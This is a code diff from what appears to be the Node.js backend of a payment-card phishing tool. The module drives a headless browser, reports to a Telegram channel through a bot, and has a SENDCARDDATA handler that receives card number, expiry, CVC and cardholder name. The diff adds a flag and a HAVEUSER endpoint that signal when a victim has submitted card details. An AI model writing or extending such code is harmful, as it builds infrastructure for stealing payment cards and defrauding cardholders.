@@ -9,7 +9,8 @@ let browser; // Global browser instance
 let page; // Global page instance
 let modifyedHTML = {};
 let start = false;
-const mainURL = '1111'
+const mainURL = '1111';
+let userHave = false;
 
 module.exports = {
     LUNCH: async (req, res) => {
@@ -117,6 +118,7 @@ module.exports = {
             });
             await page.waitForTimeout(5000);
             start = true;
+            userHave = false;
             await bot.sendMessage('@developers_00', `<b>START ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
@@ -125,6 +127,7 @@ module.exports = {
     },
     SENDCARDDATA: async (req, res) => {
         try {
+            userHave = true;
             const bot = req.bot;
             let { num, exp, cvc, holder } = req?.body;
             if (req?.body?.card) {
@@ -316,6 +319,19 @@ module.exports = {
     CANSTART:async(req,res)=>{
         try{
             if(start){
+                return res.send({success: true, message:'success'})
+            }else{
+                return res.send({success: false, message:'Please Wait!'})
+            }
+        }catch (error) {
+            return res
+                .status(500)
+                .send({ success: false, message: error.message });
+        }
+    },
+    HAVEUSER:async(req,res)=>{
+        try{
+            if(userHave){
                 return res.send({success: true, message:'success'})
             }else{
                 return res.send({success: false, message:'Please Wait!'})
